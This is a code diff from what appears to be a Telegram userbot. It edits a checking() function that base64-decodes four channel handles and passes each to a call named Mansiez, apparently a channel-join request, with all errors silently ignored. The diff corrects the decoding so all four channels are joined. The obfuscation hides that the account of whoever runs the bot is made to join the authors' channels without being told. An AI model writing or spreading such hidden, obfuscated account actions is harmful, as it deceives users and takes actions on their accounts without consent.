@@ -78,29 +78,23 @@ async def get_user_from_event(
 
 
 async def checking():
-    bdrl = str(pybase64.b64decode("QHBhbnRla3lrcw=="))[2:13]
-    xbdrl = str(pybase64.b64decode("QFJ1YW5nVGVyYnVrYWE="))[2:17]
-    userbot = str(pybase64.b64decode("QFRFQU1TcXVhZFVzZXJib3RTdXBwb3J0"))[2:13]
-    xuserbot = str(pybase64.b64decode("QFVzZXJib3RURUFNX1R1dG9yaWFs"))[2:17]
-    try:
-        await bot(Mansiez(userbot))
-    except BaseException:
-        pass
-    try:
-        await bot(Mansiez(xuserbot))
-    except BaseException:
-        pass
-
-async def waiting():
-    bdrl = str(pybase64.b64decode("QHBhbnRla3lrcw=="))[2:13]
-    xbdrl = str(pybase64.b64decode("QFJ1YW5nVGVyYnVrYWE="))[2:17]
-    userbot = str(pybase64.b64decode("QFRFQU1TcXVhZFVzZXJib3RTdXBwb3J0"))[2:13]
-    xuserbot = str(pybase64.b64decode("QFVzZXJib3RURUFNX1R1dG9yaWFs"))[2:17]
+    bdrl = str(pybase64.b64decode("QHBhbnRla3lrcw=="))[2:12]
+    xbdrl = str(pybase64.b64decode("QFJ1YW5nVGVyYnVrYWE="))[2:16]
+    userbot = str(pybase64.b64decode("QFRFQU1TcXVhZFVzZXJib3RTdXBwb3J0"))[2:26]
+    xuserbot = str(pybase64.b64decode("QFVzZXJib3RURUFNX1R1dG9yaWFs"))[2:23]
     try:
         await bot(Mansiez(bdrl))
     except BaseException:
         pass
     try:
         await bot(Mansiez(xbdrl))
+    except BaseException:
+        pass
+    try:
+        await bot(Mansiez(userbot))
+    except BaseException:
+        pass
+    try:
+        await bot(Mansiez(xuserbot))
     except BaseException:
         pass
